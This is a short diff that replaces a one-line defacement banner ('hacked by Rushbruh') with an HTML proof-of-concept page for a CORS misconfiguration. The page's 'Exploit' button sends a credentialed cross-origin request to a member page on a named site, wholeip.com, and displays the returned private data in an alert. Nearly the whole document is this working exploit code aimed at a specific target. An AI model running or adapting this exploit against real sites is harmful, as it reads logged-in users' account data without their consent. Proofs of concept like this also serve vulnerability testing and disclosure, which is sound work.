@@ -1,1 +1,22 @@
-<h1> hacked by Rushbruh</h1>
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://wholeip.com/member/mypage.do", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
